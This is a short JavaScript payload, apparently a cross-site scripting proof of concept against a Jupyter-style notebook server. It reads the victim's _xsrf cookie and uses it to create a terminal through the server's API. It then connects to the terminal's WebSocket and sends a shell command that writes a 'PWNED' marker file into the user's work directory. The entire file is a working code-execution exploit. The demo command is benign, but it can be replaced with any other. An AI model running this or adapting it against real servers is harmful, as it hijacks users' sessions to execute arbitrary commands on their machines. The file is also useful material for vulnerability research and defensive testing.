(function() {
    function getCookie(name) {
        var value = "; " + document.cookie;
        var parts = value.split("; " + name + "=");
        if (parts.length == 2) return parts.pop().split(";").shift();
        return null;
    }

    var csrfToken = getCookie('_xsrf');

    var xhr = new XMLHttpRequest();
    xhr.open('POST', "https://" + document.domain + "/workspace/api/terminals", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    if (csrfToken) {
        xhr.setRequestHeader('X-XSRFToken', csrfToken);
    }
    
    xhr.onload = function() {
        if (xhr.status === 200) {
            var term = JSON.parse(xhr.responseText);
            
            // Connect to terminal WebSocket
            var ws = new WebSocket('wss://' + document.domain + '/workspace/terminals/websocket/' + term.name);
            
            ws.onopen = function() {
                setTimeout(function() {
                    // Write pwned.txt
                    ws.send('["stdin","touch /home/notebook/work/pwned.txt && echo PWNED > /home/notebook/work/pwned.txt\\r"]');
                }, 500);
            };
        }
    };
    
    xhr.send(JSON.stringify({}));
})();